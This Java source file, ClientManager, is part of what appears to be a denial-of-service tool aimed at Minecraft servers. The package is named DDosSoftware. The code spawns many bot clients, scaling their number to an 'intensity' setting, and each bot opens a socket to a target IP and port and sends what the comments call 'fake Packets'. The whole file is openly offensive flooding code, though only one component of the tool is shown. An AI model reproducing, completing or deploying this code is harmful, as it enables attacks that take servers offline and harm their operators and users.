package src.Main.DDosSoftware.DDosLogic.Client;

import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.List;

import src.Main.DDosSoftware.DDosLogic.Flood.DDoSManager;
import src.Main.DDosSoftware.DDosLogic.Server.ServerManager;
import src.Main.DDosSoftware.Enums.MinecraftVersion;

public class ClientManager {
    public static List<Client> clients = new ArrayList<>();
    public static MinecraftVersion clientVersion = MinecraftVersion.V1_18_2;
    public static byte[] buffer = new byte[1000];

    private ClientManager() {

    }

    /**
     * create a client and add to <{@link List<clients>} in {@link clientMananger}
     * 
     * @return true if successfully add a client, false if server isn't connected.
     */
    public static boolean createClient() {
        if (ServerManager.canConnect()) {
            for (int client = 0; client < DDoSManager.getBotSizeBaseOnIntensity(DDoSManager.getIntensity()); client++) {
                clients.add(new Client(clientVersion));
            }
            return true;
        } else {
            return false;
        }
    }

    /**
     * Connect to the server by sending fake Packets
     * 
     */
    public static void connect(int clientIndex) {
        try {
            clients.get(clientIndex).socket = new Socket(ServerManager.getIp(), ServerManager.getPort());

            // Send Packet here
            clients.get(clientIndex).packet.sendPacket(clients.get(clientIndex).socket);

        } catch (UnknownHostException e) {
            System.out.println("Unknown Host");
            return;
        } catch (IOException e) {
            return;
        }
        System.out.println(clients.get(clientIndex).socket.getLocalPort() + "'s connection is established!");
        return;
    }
}
